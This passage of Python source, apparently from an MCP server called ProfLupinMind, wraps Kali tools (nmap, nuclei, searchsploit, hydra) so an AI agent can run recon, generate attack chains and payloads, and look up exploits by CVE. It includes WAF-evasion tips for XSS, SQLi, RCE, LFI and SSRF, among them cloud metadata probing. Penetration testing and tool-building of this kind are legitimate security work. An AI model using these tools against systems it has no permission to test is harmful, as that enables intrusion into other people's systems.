    schema_type: auto | openapi | swagger | graphql | wsdl
    """
    logger.info(f"📋 API-SCHEMA: {target} | type={schema_type}")
    common_paths = [
        "/swagger.json", "/swagger/v1/swagger.json", "/api-docs",
        "/openapi.json", "/api/swagger.json", "/v1/swagger.json",
        "/.well-known/openapi.json", "/graphql", "/api/graphql",
    ]
    script = f"""
import urllib.request, json
base = '{target}'.rstrip('/')
paths = {common_paths}
found = []
for path in paths:
    url = base + path
    try:
        req = urllib.request.Request(url, headers={{'User-Agent': 'ProfLupinMind/1.0'}})
        with urllib.request.urlopen(req, timeout=5) as r:
            ct = r.headers.get('Content-Type', '')
            body = r.read(4096).decode(errors='replace')
            if any(k in body for k in ['swagger', 'openapi', 'paths', '__schema']):
                print(f'[FOUND] {{url}} ({{ct}})')
                found.append(url)
                try:
                    data = json.loads(body)
                    if 'paths' in data:
                        print(f'  Endpoints: {{len(data["paths"])}}')
                        for ep in list(data["paths"].keys())[:10]:
                            print(f'    {{ep}}')
                except: pass
    except: pass
if not found:
    print('No API schema endpoints found at common paths')
"""
    return await execute_python_script(script=script, filename="api_schema.py",
                                       allow_dangerous=True, timeout=30)


# ============================================================================
# AI INTELLIGENCE TOOLS
# ============================================================================

@mcp.tool()
async def ai_generate_attack_suite(
    target: str,
    target_type: str = "",
    objective: str = "comprehensive",
    include_payloads: bool = True,
    open_ports: list[int] | None = None,
) -> dict[str, Any]:
    """
    AI attack suite generator — combines target profiling, attack chain, tool selection,
    and payload generation into a complete offensive package.
    objective: comprehensive | quick | stealth | bug_bounty | ctf
    """
    logger.info(f"🤖 AI-ATTACK-SUITE: {target} | objective={objective}")
    profile = _intelligence.build_profile(target=target, open_ports=open_ports or [])
    chain = _intelligence.generate_attack_chain(target, profile=profile, objective=objective)
    tools_ranked = _intelligence.select_optimal_tools(profile.target_type, top_n=10)

    payloads = {}
    if include_payloads:
        for vuln in ["xss", "sqli", "rce", "lfi", "ssrf"]:
            try:
                ps = _payload_gen.generate(vuln, "", "")
                payloads[vuln] = ps.payloads[:3]
            except Exception:
                pass

    result = {
        "target": target,
        "profile": profile.to_dict(),
        "attack_chain": chain.to_dict(),
        "top_tools": [{"tool": t, "effectiveness": e} for t, e in tools_ranked],
        "payloads": payloads,
        "objective": objective,
        "estimated_time": f"{chain.total_time:.0f}s",
        "success_probability": f"{chain.success_prob:.1%}",
        "recommended_workflow": _recommend_workflow(profile.target_type.value),
    }
    logger.info(f"✅ AI-SUITE: {len(chain.steps)} steps | {len(tools_ranked)} tools | {len(payloads)} payload sets")
    return result


@mcp.tool()
async def ai_test_payload(
    payload: str,
    vuln_class: str,
    target_tech: str = "",
    context: str = "",
) -> dict[str, Any]:
    """
    AI payload effectiveness analyzer — evaluate payload quality and suggest improvements.
    vuln_class: xss | sqli | rce | lfi | ssrf | ssti | xxe | cmd_injection
    """
    logger.info(f"🧪 AI-TEST-PAYLOAD: class={vuln_class}")
    payload_set = _payload_gen.generate(vuln_class, target_tech, context)
    similar = [p for p in payload_set.payloads if any(
        c in p for c in payload.split() if len(c) > 2
    )][:5]
    evasion_tips = {
        "xss": ["URL encode <script>", "Use event handlers: onerror, onload", "Try SVG/HTML5 tags"],
        "sqli": ["Comment variations: --, #, /**/", "Case variation: SeLeCt", "Use UNION-based or blind"],
        "rce": ["Try backticks, $(), pipe |", "Use semicolons or &&", "URL encode special chars"],
        "lfi": ["PHP wrappers: php://filter", "Double encoding: %252e", "Null byte: %00 (legacy)"],
        "ssrf": ["Try 127.0.0.1, 0.0.0.0, localhost", "IPv6: [::1]", "Cloud metadata: 169.254.169.254"],
        "ssti": ["Try {{7*7}} first", "Engine detection: Jinja2, Twig, Freemarker", "Use _class_ chain"],
    }
    result = {
        "payload": payload,
        "vuln_class": vuln_class,
        "risk_rating": payload_set.risk_rating,
        "similar_payloads": similar,
        "all_payloads": payload_set.payloads[:10],
        "evasion_techniques": evasion_tips.get(vuln_class, ["Encode payload", "Case variation", "Context escape"]),
        "recommended_tools": payload_set.tools[:5] if hasattr(payload_set, "tools") else [],
        "notes": payload_set.notes if hasattr(payload_set, "notes") else [],
    }
    return result


@mcp.tool()
async def ai_reconnaissance_workflow(
    target: str,
    scope: list[str] | None = None,
    passive_only: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    AI-driven reconnaissance workflow — intelligently sequences recon tools based on target.
    passive_only: use only passive/OSINT tools (no active probing).
    scope: list of in-scope domains/IPs.
    """
    logger.info(f"🔍 AI-RECON: {target} | passive={passive_only}")
    profile = _intelligence.build_profile(target=target)

    if passive_only:
        recon_tools = ["subfinder", "amass", "theHarvester", "waybackurls", "gau",
                       "whois", "dnsrecon", "spiderfoot"]
    elif profile.target_type.value == "web":
        recon_tools = ["subfinder", "amass", "httpx", "waybackurls", "gau",
                       "katana", "hakrawler", "nuclei", "whatweb", "wafw00f"]
    elif profile.target_type.value in ("network", "unknown"):
        recon_tools = ["nmap", "masscan", "netdiscover", "enum4linux", "nbtscan",
                       "smbmap", "snmpwalk", "ldapsearch"]
    else:
        recon_tools = ["nmap", "subfinder", "whatweb", "nuclei", "httpx"]

    plan = {
        "target": target,
        "profile": profile.to_dict(),
        "passive_only": passive_only,
        "recon_plan": [
            {"step": i + 1, "tool": t,
             "purpose": _get_tool_purpose(t),
             "command": _build_command(t, target, "")}
            for i, t in enumerate(recon_tools)
        ],
        "scope": scope or [target],
        "estimated_time": f"{len(recon_tools) * 60}s",
    }
    logger.info(f"✅ AI-RECON PLAN: {len(recon_tools)} steps")
    return plan


@mcp.tool()
async def ai_vulnerability_assessment(
    target: str,
    open_ports: list[int] | None = None,
    services: dict[str, str] | None = None,
    known_techs: list[str] | None = None,
) -> dict[str, Any]:
    """
    AI vulnerability assessment — prioritized vulnerability checklist based on target profile.
    Returns CVSS-scored findings with exploitation paths and remediation.
    """
    logger.info(f"🎯 AI-VULN-ASSESSMENT: {target}")
    svcs: dict[int, str] = {}
    if services:
        for k, v in services.items():
            try: svcs[int(k)] = v
            except ValueError: pass
    profile = _intelligence.build_profile(
        target=target,
        open_ports=open_ports or [],
        services=svcs,
        banners=known_techs or [],
    )
    chain = _intelligence.generate_attack_chain(target, profile=profile, objective="comprehensive")
    vuln_checks = _build_vuln_checklist(profile)
    result = {
        "target": target,
        "profile": profile.to_dict(),
        "risk_level": profile.risk_level.value,
        "attack_surface_score": profile.attack_surface,
        "vulnerability_checklist": vuln_checks,
        "attack_chain": chain.to_dict(),
        "priority_tools": [s.tool for s in chain.steps[:5]],
        "estimated_findings": _estimate_findings(profile),
    }
    logger.info(f"✅ AI-VULN: {len(vuln_checks)} checks | risk={profile.risk_level.value}")
    return result


@mcp.tool()
async def detect_technologies_ai(
    target: str,
    session_id: str = "",
) -> dict[str, Any]:
    """
    AI technology detection — identify web frameworks, CMS, CDN, WAF, and server stack.
    Combines multiple detection methods for high-confidence fingerprinting.
    """
    logger.info(f"🔭 DETECT-TECH: {target}")
    profile = _intelligence.build_profile(target=target)
    whatweb_result = await run_kali_tool(tool="whatweb", target=target,
                                         options="-v -a 3", session_id=session_id)
    wafw00f_result = await run_kali_tool(tool="wafw00f", target=target,
                                         options="", session_id=session_id)
    return {
        "target": target,
        "detected_technologies": profile.technologies,
        "cms": profile.cms or "Not detected",
        "cloud_provider": profile.cloud_provider or "Not detected",
        "target_type": profile.target_type.value,
        "whatweb": whatweb_result.get("output", "")[:2000],
        "waf_detection": wafw00f_result.get("output", "")[:500],
        "confidence": profile.confidence,
        "recommended_tests": _get_tech_specific_tests(profile.technologies, profile.cms),
    }


@mcp.tool()
async def advanced_payload_generation(
    vuln_class: str,
    target_tech: str = "",
    context: str = "",
    evasion_level: int = 1,
    quantity: int = 20,
) -> dict[str, Any]:
    """
    Advanced payload generation with evasion — generates large payload sets with WAF bypass techniques.
    evasion_level: 0 (none) | 1 (basic encoding) | 2 (double encoding) | 3 (polymorphic)
    quantity: number of payloads to generate
    vuln_class: rce | sqli | xss | lfi | ssrf | ssti | xxe | cmd_injection | file_upload
    """
    logger.info(f"💉 ADV-PAYLOAD: {vuln_class} | evasion={evasion_level} | qty={quantity}")
    payload_set = _payload_gen.generate(vuln_class, target_tech, context)
    evasion_variants = _apply_evasion(payload_set.payloads, evasion_level)
    result = {
        "vuln_class": vuln_class,
        "target_tech": target_tech,
        "context": context,
        "evasion_level": evasion_level,
        "base_payloads": payload_set.payloads[:quantity // 2],
        "evasion_payloads": evasion_variants[:quantity // 2],
        "all_payloads": (payload_set.payloads + evasion_variants)[:quantity],
        "risk_rating": payload_set.risk_rating,
        "waf_bypass_techniques": _get_waf_bypass_techniques(vuln_class, evasion_level),
    }
    return result


@mcp.tool()
async def research_zero_day_opportunities(
    target: str,
    open_ports: list[int] | None = None,
    services: dict[str, str] | None = None,
    known_cves: list[str] | None = None,
) -> dict[str, Any]:
    """
    Zero-day opportunity research — identify attack surface areas with high potential
    for undiscovered vulnerabilities based on target profile and service fingerprints.
    """
    logger.info(f"🔬 ZERO-DAY-RESEARCH: {target}")
    svcs: dict[int, str] = {}
    if services:
        for k, v in services.items():
            try: svcs[int(k)] = v
            except ValueError: pass
    profile = _intelligence.build_profile(
        target=target, open_ports=open_ports or [], services=svcs
    )
    opportunities = _identify_zeroday_surface(profile, known_cves or [])
    return {
        "target": target,
        "profile": profile.to_dict(),
        "attack_surface_score": profile.attack_surface,
        "zero_day_opportunities": opportunities,
        "research_priorities": _get_research_priorities(profile),
        "fuzzing_targets": _get_fuzzing_targets(profile),
        "recommended_tools": ["fuzzer", "afl", "libfuzzer", "honggfuzz", "boofuzz"],
    }


@mcp.tool()
async def monitor_cve_feeds(
    target: str,
    technologies: list[str] | None = None,
    severity: str = "high,critical",
    days: int = 30,
) -> dict[str, Any]:
    """
    CVE feed monitor — check for recent CVEs affecting identified technologies.
    severity: low | medium | high | critical (comma-separated)
    days: lookback window for recent CVEs
    """
    logger.info(f"📡 CVE-MONITOR: {target} | techs={technologies}")
    profile = _intelligence.build_profile(target=target)
    techs = technologies or profile.technologies or ["apache", "nginx", "php", "openssh"]
    cve_data = _build_cve_intelligence(techs, severity, days)
    return {
        "target": target,
        "monitored_technologies": techs,
        "severity_filter": severity,
        "lookback_days": days,
        "cve_summary": cve_data,
        "recommended_scanners": ["nuclei -t cves/", "searchsploit", "nmap --script vuln"],
        "live_check_commands": (
            [f"nuclei -u {target} -t cves/ -severity {severity}"] +
            [f"searchsploit {tech}" for tech in techs[:3]]
        ),
    }


@mcp.tool()
async def generate_exploit_from_cve(
    cve_id: str,
    target: str = "",
    target_version: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Generate exploitation approach for a known CVE — searchsploit lookup + Metasploit module search.
    cve_id: CVE identifier (e.g. 'CVE-2021-44228')
    target_version: affected software version for precision
    """
    logger.info(f"💥 EXPLOIT-FROM-CVE: {cve_id}")
    searchsploit_result = await run_kali_tool(
        tool="searchsploit",
        target=cve_id,
        options="--json",
        session_id=session_id,
    )
    cve_info = _get_cve_intelligence(cve_id)
    return {
        "cve_id": cve_id,
        "target": target,
        "target_version": target_version,
        "cve_info": cve_info,
        "searchsploit_results": searchsploit_result.get("output", "")[:3000],
        "metasploit_search": f"msfconsole -q -x 'search {cve_id}; exit'",
        "nuclei_template": f"nuclei -u {target} -t cves/{cve_id.lower()}.yaml" if target else f"nuclei -t cves/{cve_id.lower()}.yaml",
        "exploitation_notes": cve_info.get("exploitation_notes", []),
        "remediation": cve_info.get("remediation", "Apply vendor patch immediately."),
    }


@mcp.tool()
async def threat_hunting_assistant(
    target: str,
    threat_actor: str = "",
    ttps: list[str] | None = None,
    log_sources: list[str] | None = None,
) -> dict[str, Any]:
    """
    Threat hunting assistant — generate hunt hypotheses, IOC patterns, and detection queries.
    threat_actor: APT group name or actor descriptor (e.g. 'APT29', 'ransomware')
    ttps: MITRE ATT&CK technique IDs (e.g. ['T1059', 'T1003'])
    log_sources: available logs (e.g. ['windows_event', 'syslog', 'network_flow'])
    """
    logger.info(f"🕵️  THREAT-HUNT: {target} | actor={threat_actor}")
    hunt_plan = _build_threat_hunt_plan(target, threat_actor, ttps or [], log_sources or [])
    return {
        "target": target,
        "threat_actor": threat_actor or "unknown",
        "ttps": ttps or [],
        "hunt_hypotheses": hunt_plan["hypotheses"],
        "ioc_patterns": hunt_plan["ioc_patterns"],
        "detection_queries": hunt_plan["detection_queries"],
        "recommended_tools": ["volatility", "yara", "zeek", "osquery", "sigma"],
        "mitre_mappings": hunt_plan["mitre_mappings"],
    }


@mcp.tool()
async def vulnerability_intelligence_dashboard(
    targets: list[str],
    include_cves: bool = True,
    include_exploits: bool = True,
) -> dict[str, Any]:
    """
    Vulnerability intelligence dashboard — aggregate risk across multiple targets.
    Returns a prioritized view of exposure, CVEs, and exploitation likelihood.
    """
    logger.info(f"📊 VULN-INTEL-DASHBOARD: {len(targets)} targets")
    dashboard = []
    for target in targets[:10]:
        profile = _intelligence.build_profile(target=target)
        chain = _intelligence.generate_attack_chain(target, profile=profile)
        entry = {
            "target": target,
            "risk_level": profile.risk_level.value,
            "attack_surface": profile.attack_surface,
            "target_type": profile.target_type.value,
            "top_attack_steps": [s.tool for s in chain.steps[:3]],
            "cve_exposure": _estimate_cve_exposure(profile) if include_cves else [],
            "exploitability": f"{chain.success_prob:.1%}" if include_exploits else "N/A",
        }
        dashboard.append(entry)
    dashboard.sort(key=lambda x: x["attack_surface"], reverse=True)
    return {
        "total_targets": len(targets),
        "dashboard": dashboard,
        "critical_targets": [d for d in dashboard if d["risk_level"] in ("critical", "high")],
        "summary": {
            "avg_attack_surface": sum(d["attack_surface"] for d in dashboard) / max(len(dashboard), 1),
            "high_risk_count": sum(1 for d in dashboard if d["risk_level"] in ("critical", "high")),
        },
    }


@mcp.tool()
async def correlate_threat_intelligence(
    iocs: list[str],
    ioc_types: list[str] | None = None,
    context: str = "",
) -> dict[str, Any]:
    """
    Threat intelligence correlation — analyze IOCs (IPs, domains, hashes, URLs) and
    map to known attack patterns, TTPs, and threat actor profiles.
    iocs: list of indicators (IPs, domains, hashes, URLs)
    ioc_types: list matching iocs (ip | domain | hash | url | email) — auto-detected if empty
    """
    logger.info(f"🔗 THREAT-INTEL-CORRELATE: {len(iocs)} IOCs")
    results = []
    for i, ioc in enumerate(iocs[:20]):
        detected_type = ioc_types[i] if ioc_types and i < len(ioc_types) else _detect_ioc_type(ioc)
        analysis = _analyze_ioc(ioc, detected_type, context)
        results.append(analysis)
    return {
        "total_iocs": len(iocs),
        "analysis": results,
        "threat_actor_candidates": _correlate_threat_actors(results),
        "attack_phase": _infer_attack_phase(results),
        "recommended_actions": _get_threat_response_actions(results),
        "mitre_techniques": _map_iocs_to_mitre(results),
    }


@mcp.tool()
async def discover_attack_chains(
    target: str,
    entry_points: list[str] | None = None,
    objectives: list[str] | None = None,
) -> dict[str, Any]:
    """
    Multi-path attack chain discovery — enumerate all viable attack paths from entry points to objectives.
    entry_points: known access vectors (e.g. ['web', 'ssh', 'smb'])
    objectives: goals (e.g. ['rce', 'data_exfil', 'lateral_movement', 'privilege_escalation'])
    """
    logger.info(f"⚔️  DISCOVER-CHAINS: {target}")
    profile = _intelligence.build_profile(target=target)
    chains = []
    objectives = objectives or ["rce", "data_exfil", "privilege_escalation"]
    for obj in objectives:
        chain = _intelligence.generate_attack_chain(target, profile=profile, objective=obj)
        chains.append({"objective": obj, "chain": chain.to_dict()})
    return {
        "target": target,
        "profile": profile.to_dict(),
        "entry_points": entry_points or _infer_entry_points(profile),
        "attack_chains": chains,
        "total_paths": len(chains),
        "highest_success": max(chains, key=lambda c: c["chain"].get("success_prob", 0)) if chains else {},
    }


# ============================================================================
# SYSTEM METRICS, DASHBOARD & UTILITY TOOLS
# ============================================================================

@mcp.tool()
async def display_system_metrics() -> dict[str, Any]:
    """Display real-time system metrics — CPU, memory, disk, network, and load average."""
    logger.info("📊 SYSTEM METRICS")
    script = """
import subprocess, json, os

def run(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, text=True, timeout=5).strip()
    except:
        return 'N/A'

metrics = {
    'cpu_usage': run("top -bn1 | grep 'Cpu(s)' | awk '{print $2}'"),
    'memory': run("free -h | grep Mem | awk '{print \"Total: \"$2\" | Used: \"$3\" | Free: \"$4}'"),
    'disk': run("df -h / | tail -1 | awk '{print \"Size: \"$2\" | Used: \"$3\" | Avail: \"$4\" | Use%: \"$5}'"),
    'load_avg': run("uptime | awk -F'load average:' '{print $2}'"),
    'top_processes': run("ps aux --sort=-%cpu | head -6 | awk '{print $1, $2, $3, $4, $11}'"),
    'network_interfaces': run("ip -brief addr | awk '{print $1, $3}'"),
    'connections': run("ss -tuln | wc -l"),
    'uptime': run("uptime -p"),
}
print(json.dumps(metrics, indent=2))
"""
    return await execute_python_script(script=script, filename="sys_metrics.py",
                                       allow_dangerous=True, timeout=15)


@mcp.tool()
async def get_live_dashboard() -> dict[str, Any]:
    """Live ProfLupinMind operations dashboard — active tasks, processes, cache, telemetry, and session summary."""
    logger.info("📊 LIVE DASHBOARD")
    return {
        "dashboard": {
            "active_processes": _processes.list(include_finished=False),
            "background_tasks": _tasks.list(include_done=False),
            "telemetry": _telemetry.stats(),
            "cache": _cache.stats(),
            "resources": _resources.get_current_usage(),
            "performance": _performance.get_summary(),
            "health": _runtime_health.report(),
            "workspace": _workspace.list(".") if hasattr(_workspace, "list") else {},
        }
    }


@mcp.tool()
async def server_health() -> dict[str, Any]:
    """ProfLupinMind server health check — verify all subsystems are operational."""
    logger.info("💊 SERVER HEALTH CHECK")
    health: dict[str, Any] = {"status": "healthy", "checks": {}}
    # Check guardian
    try:
        Guardian(read_only_mode=False)
        health["checks"]["guardian"] = "ok"
    except Exception as e:
        health["checks"]["guardian"] = f"error: {e}"
        health["status"] = "degraded"
    # Check sessions DB
    try:
        sessions.SessionLocal()
        health["checks"]["sessions_db"] = "ok"
    except Exception as e:
        health["checks"]["sessions_db"] = f"error: {e}"
        health["status"] = "degraded"
    # Check workspace
    try:
        _workspace.list(".")
        health["checks"]["workspace"] = "ok"
    except Exception as e:
        health["checks"]["workspace"] = f"error: {e}"
    # Check telemetry
    health["checks"]["telemetry"] = "ok"
    health["checks"]["cache"] = "ok"
    health["checks"]["resource_monitor"] = "ok"
    health["checks"]["performance_dashboard"] = "ok"
    health["checks"]["intelligence_engine"] = "ok"
    health["checks"]["payload_generator"] = "ok"
    health["telemetry"] = _telemetry.stats()
    health["cache"] = _cache.stats()
    health["runtime_health"] = _runtime_health.report()
    return health


@mcp.tool()
async def tool_doctor() -> dict[str, Any]:
    """Pre-flight check: verify binaries, wordlists, and templates are ready before scanning.

    Returns a per-tool status dict with ok/missing/wrong_binary diagnosis and
    a recommended_fix string for every failure.
    """
    logger.info("🩺 TOOL DOCTOR: running pre-flight checks")

    WORDLISTS = {
        "common": "/usr/share/wordlists/dirb/common.txt",
        "rockyou": "/usr/share/wordlists/rockyou.txt",
        "big": "/usr/share/wordlists/dirb/big.txt",
        "dirbuster_medium": "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
        "seclists_web": "/usr/share/seclists/Discovery/Web-Content/common.txt",
    }

    NUCLEI_TEMPLATES = [
        "/root/nuclei-templates",
        str(Path.home() / "nuclei-templates"),
        "/home/kali/nuclei-templates",
    ]

    # tool name → (binary, version_flag, category)
    TOOLS_TO_CHECK = [
        ("nmap",        "nmap",         "--version", "recon"),
        ("rustscan",    "rustscan",     "--version", "recon"),
        ("masscan",     "masscan",      "--version", "recon"),
        ("httpx",       "httpx",        "-version",  "web"),
        ("subfinder",   "subfinder",    "-version",  "recon"),
        ("nuclei",      "nuclei",       "-version",  "vuln"),
        ("katana",      "katana",       "-version",  "web"),
        ("gobuster",    "gobuster",     "version",   "web"),
        ("ffuf",        "ffuf",         "-V",        "web"),
        ("feroxbuster", "feroxbuster",  "--version", "web"),
        ("dirsearch",   "dirsearch",    "--version", "web"),
        ("nikto",       "nikto",        "--Version", "web"),
        ("wpscan",      "wpscan",       "--version", "web"),
        ("sqlmap",      "sqlmap",       "--version", "sqli"),
        ("smbmap",      "smbmap",       "--version", "smb"),
        ("enum4linux",  "enum4linux",   "--help",    "smb"),
        ("fierce",      "fierce",       "--help",    "dns"),
        ("dnsenum",     "dnsenum",      "--help",    "dns"),
        ("amass",       "amass",        "-version",  "recon"),
        ("trivy",       "trivy",        "--version", "cloud"),
        ("checkov",     "checkov",      "--version", "cloud"),
        ("hydra",       "hydra",        "--version", "creds"),
        ("hashcat",     "hashcat",      "--version", "creds"),
        ("john",        "john",         "--version", "creds"),
    ]

    results: dict[str, Any] = {"checks": {}, "wordlists": {}, "templates": {}, "summary": {}}
    ok_count = 0
    missing_count = 0
    wrong_count = 0

    for name, binary, version_flag, category in TOOLS_TO_CHECK:
        path = shutil.which(binary)
        if not path:
            results["checks"][name] = {
                "status": "missing",
                "category": category,
                "recommended_fix": f"apt install {binary} -y  OR  go install (ProjectDiscovery tools)",
            }
            missing_count += 1
            continue

        # httpx: detect ProjectDiscovery binary vs the Python httpx package shim
        if name == "httpx":
            pd_paths = ["/home/kali/go/bin/httpx", "/usr/local/bin/httpx", "/root/go/bin/httpx"]
            is_pd = any(path == p or path.startswith(p) for p in pd_paths)
            if not is_pd:
                results["checks"][name] = {
                    "status": "wrong_binary",
                    "path": path,
                    "category": category,
                    "recommended_fix": (
                        "go install github.com/projectdiscovery/httpx/cmd/httpx@latest  "
                        "then ensure /home/kali/go/bin is first in PATH"
                    ),
                }
                wrong_count += 1
                continue

        # Quick version/help smoke test (non-blocking, short timeout)
        try:
            proc = await asyncio.create_subprocess_exec(
                binary, version_flag,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=_ENV,
            )
            try:
                stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=5)
                version_out = (stdout + stderr).decode("utf-8", errors="replace")[:200].strip()
                first_line = version_out.split("\n")[0] if version_out else "(no output)"
                results["checks"][name] = {
                    "status": "ok",
                    "path": path,
                    "category": category,
                    "version": first_line,
                }
                ok_count += 1
            except asyncio.TimeoutError:
                results["checks"][name] = {
                    "status": "ok",
                    "path": path,
                    "category": category,
                    "version": "(version check timed out — binary exists)",
                }
                ok_count += 1
        except Exception as exc:
            results["checks"][name] = {
                "status": "error",
                "path": path,
                "category": category,
                "error": str(exc),
            }

    # Wordlist checks
    for wl_name, wl_path in WORDLISTS.items():
        results["wordlists"][wl_name] = {
            "path": wl_path,
            "status": "ok" if Path(wl_path).exists() else "missing",
        }
        if not Path(wl_path).exists():
            results["wordlists"][wl_name]["recommended_fix"] = (
                "apt install seclists wordlists -y  OR  "
                "gzip -d /usr/share/wordlists/rockyou.txt.gz"
            )

    # Nuclei template checks
    template_found = False
    for tdir in NUCLEI_TEMPLATES:
        if Path(tdir).is_dir():
            tcount = sum(1 for _ in Path(tdir).rglob("*.yaml"))
            results["templates"]["nuclei"] = {
                "status": "ok",
                "path": tdir,
                "template_count": tcount,
            }
            template_found = True
            break
    if not template_found:
        results["templates"]["nuclei"] = {
            "status": "missing",
            "recommended_fix": "nuclei -update-templates",
        }

    results["summary"] = {
        "tools_ok": ok_count,
        "tools_missing": missing_count,
        "tools_wrong_binary": wrong_count,
        "wordlists_ok": sum(1 for v in results["wordlists"].values() if v["status"] == "ok"),
        "wordlists_missing": sum(1 for v in results["wordlists"].values() if v["status"] == "missing"),
    }
    logger.info(f"🩺 TOOL DOCTOR: {ok_count} ok | {missing_count} missing | {wrong_count} wrong")
    return results


@mcp.tool()
async def error_handling_statistics() -> dict[str, Any]:
    """Return ProfLupinMind error handling statistics and failure pattern analysis."""
    logger.info("📉 ERROR STATS")
    telemetry = _telemetry.stats()
    total = telemetry.get("commands", 0)
    successes = telemetry.get("successes", 0)
    failures = telemetry.get("failures", 0)
    timeouts = telemetry.get("timeouts", 0)
    return {
        "total_commands": total,
        "successes": successes,
        "failures": failures,
        "timeouts": timeouts,
        "success_rate": f"{(successes / max(total, 1)) * 100:.1f}%",
        "failure_rate": f"{(failures / max(total, 1)) * 100:.1f}%",
        "avg_duration": telemetry.get("average_duration", 0),
        "cache_hits": _cache.stats().get("hits", 0),
        "cache_misses": _cache.stats().get("misses", 0),
    }


@mcp.tool()
async def format_tool_output_visual(
    tool_name: str,
    output: str,
    exit_code: int = 0,
    duration: float = 0.0,
    timed_out: bool = False,
) -> dict[str, Any]:
    """Format raw tool output into a styled ProfLupinMind visual result card."""
    logger.info(f"🎨 FORMAT OUTPUT: {tool_name}")
    card = ProfLupinMindVisualEngine.result_card(tool_name, duration, exit_code, output, timed_out)
    summary_lines = [line.strip() for line in output.splitlines() if line.strip()][:20]
    return {
        "tool": tool_name,
        "visual_card": card,
        "summary": "\n".join(summary_lines),
        "exit_code": exit_code,
        "duration": duration,
        "status": "timeout" if timed_out else ("success" if exit_code == 0 else "failed"),
    }


# ============================================================================
# URL PROCESSING & RECON PIPELINE TOOLS
# ============================================================================

@mcp.tool()
async def paramspider_mining(
    domain: str,
    quiet: bool = True,
    session_id: str = "",
) -> dict[str, Any]:
    """
    Paramspider — mine URLs with parameters from web archives for fuzzing and testing.
    """
    logger.info(f"🕷️  PARAMSPIDER: {domain}")
    silent_flag = "-s" if quiet else ""
    options = silent_flag.strip()
    return await run_kali_tool(tool="paramspider", target=domain,
                               options=options, session_id=session_id)


@mcp.tool()
async def anew_data_processing(
    data: str,
    output_file: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    anew — deduplicate and append only new lines to a file. Ideal for recon pipelines.
    data: newline-separated input data to deduplicate
    """
    logger.info(f"📋 ANEW: {len(data.splitlines())} lines")
    lines = list(dict.fromkeys(line.strip() for line in data.splitlines() if line.strip()))
    if output_file:
        result = _workspace.write(output_file, "\n".join(lines), append=True)
        return {"success": True, "unique_lines": len(lines), "output_file": result.get("path", output_file)}
    return {"success": True, "unique_lines": len(lines), "data": lines}


@mcp.tool()
async def uro_url_filtering(
    urls: str,
    session_id: str = "",
) -> dict[str, Any]:
    """
    uro — filter duplicate URLs sharing the same parameter structure.
    Reduces large URL lists to unique parameter patterns for efficient testing.
    urls: newline-separated URL list
    """
    logger.info(f"🔗 URO: filtering {len(urls.splitlines())} URLs")
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    seen_patterns: set = set()
    filtered: list = []
    for url in urls.splitlines():
        url = url.strip()
        if not url:
            continue
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            pattern = (parsed.netloc, parsed.path, frozenset(params.keys()))
            if pattern not in seen_patterns:
                seen_patterns.add(pattern)
                filtered.append(url)
        except Exception:
            filtered.append(url)
    return {
        "input_count": len([u for u in urls.splitlines() if u.strip()]),
        "output_count": len(filtered),
        "reduction": f"{(1 - len(filtered) / max(len(urls.splitlines()), 1)) * 100:.1f}%",
        "filtered_urls": filtered,
    }


@mcp.tool()
async def qsreplace_parameter_replacement(
    urls: str,
    replacement: str = "FUZZ",
    append: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    qsreplace — replace all query string parameter values with a test value.
    Useful for preparing URL lists for fuzzing and injection testing.
    replacement: value to replace all parameter values with (default: FUZZ)
    append: append replacement instead of replacing
    """
    logger.info(f"🔄 QSREPLACE: replacement={replacement} | {len(urls.splitlines())} URLs")
    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
    results = []
    for url in urls.splitlines():
        url = url.strip()
        if not url:
            continue
        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query, keep_blank_values=True)
            if not params:
                results.append(url)
                continue
            new_params = {
                k: [v[0] + replacement if append else replacement for v in vals]
                for k, vals in params.items()
            }
            new_query = urlencode(new_params, doseq=True)
            results.append(urlunparse(parsed._replace(query=new_query)))
        except Exception:
            results.append(url)
    return {
        "input_count": len([u for u in urls.splitlines() if u.strip()]),
        "output_count": len(results),
        "replacement": replacement,
        "urls": results,
    }


# ============================================================================
# DEDICATED NETWORK SCANNING TOOLS
# ============================================================================

@mcp.tool()
async def nmap_scan(
    target: str,
    scan_type: str = "-sV",
    ports: str = "",
    scripts: str = "",
    timing: str = "T4",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Nmap port scanner — the gold standard for network discovery and security auditing.
    scan_type: -sV (version) | -sC (scripts) | -sS (SYN stealth) | -sU (UDP) | -A (aggressive)
    ports: comma-separated or ranges e.g. '80,443,8080' or '1-1000' — all ports if empty
    scripts: NSE script category e.g. 'vuln' | 'auth' | 'default' | 'safe'
    timing: T0-T5 (paranoid to insane)
    """
    logger.info(f"🔍 NMAP: {target} | type={scan_type} | ports={ports}")
    port_flag = f"-p {ports}" if ports else "--top-ports 1000"
    script_flag = f"--script {scripts}" if scripts else ""
    options = f"{scan_type} {port_flag} -{timing} {script_flag}".strip()
    requires_root = scan_type in {"-sS", "-sU"} or "-O" in scan_type or scan_type == "-A"
    return await run_kali_tool(tool="nmap-root" if requires_root else "nmap", target=target,
                               options=options, session_id=session_id,
                               allow_dangerous=requires_root)


@mcp.tool()
async def nmap_advanced_scan(
    target: str,
    os_detection: bool = True,
    vuln_scripts: bool = False,
    stealth: bool = False,
    ports: str = "1-65535",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Advanced Nmap scan with OS detection, version enumeration, and optional vuln scripts.
    os_detection: enable OS and version detection (-A flag)
    vuln_scripts: run vuln NSE script category
    stealth: SYN scan instead of full connect (requires root)
    """
    logger.info(f"🔍 NMAP-ADVANCED: {target} | os={os_detection} | vuln={vuln_scripts}")
    scan_flag = "-sS" if stealth else "-sT"
    detail_flag = "-A" if os_detection else "-sV -sC"
    vuln_flag = "--script vuln" if vuln_scripts else ""
    options = f"{scan_flag} {detail_flag} -p {ports} -T4 {vuln_flag}".strip()
    requires_root = stealth or os_detection
